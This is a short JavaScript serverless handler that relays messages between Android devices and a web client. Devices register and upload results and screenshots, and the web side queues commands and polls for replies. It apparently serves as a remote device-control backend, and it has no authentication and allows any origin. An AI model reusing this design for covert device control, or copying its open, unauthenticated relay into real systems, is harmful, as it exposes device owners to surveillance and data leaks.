// Store messages in memory (Vercel serverless)
let messageQueue = [];
let connectedDevices = [];
let lastId = 0;

export default async function handler(req, res) {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // POST: Android sends results or web sends commands
    if (req.method === 'POST') {
        const { action, data, device } = req.body;
        
        if (action === 'register') {
            connectedDevices.push({
                id: Date.now(),
                info: data,
                lastSeen: Date.now()
            });
            return res.json({ success: true, message: 'Registered' });
        }
        
        if (action === 'result') {
            lastId++;
            messageQueue.push({
                id: lastId,
                type: 'result',
                data: data,
                time: Date.now()
            });
            
            // Keep only last 200 messages
            if (messageQueue.length > 200) {
                messageQueue = messageQueue.slice(-200);
            }
            
            return res.json({ success: true });
        }
        
        if (action === 'screenshot') {
            lastId++;
            messageQueue.push({
                id: lastId,
                type: 'screenshot',
                data: data,
                time: Date.now()
            });
            return res.json({ success: true });
        }
        
        if (action === 'command') {
            lastId++;
            messageQueue.push({
                id: lastId,
                type: 'pending_command',
                data: data,
                time: Date.now()
            });
            return res.json({ success: true });
        }

        if (action === 'error') {
            lastId++;
            messageQueue.push({
                id: lastId,
                type: 'error',
                data: data,
                time: Date.now()
            });
            return res.json({ success: true });
        }
    }

    // GET: Poll for messages
    if (req.method === 'GET') {
        const since = parseInt(req.query.since) || 0;
        const clientType = req.query.client || 'web';
        
        // Clean up dead devices
        connectedDevices = connectedDevices.filter(d => 
            Date.now() - d.lastSeen < 60000
        );
        
        // Get new messages
        const newMessages = messageQueue.filter(m => m.id > since);
        
        // Clean old messages
        if (messageQueue.length > 500) {
            messageQueue = messageQueue.slice(-300);
        }
        
        return res.json({
            messages: newMessages,
            devices: connectedDevices,
            lastId: lastId
        });
    }
}
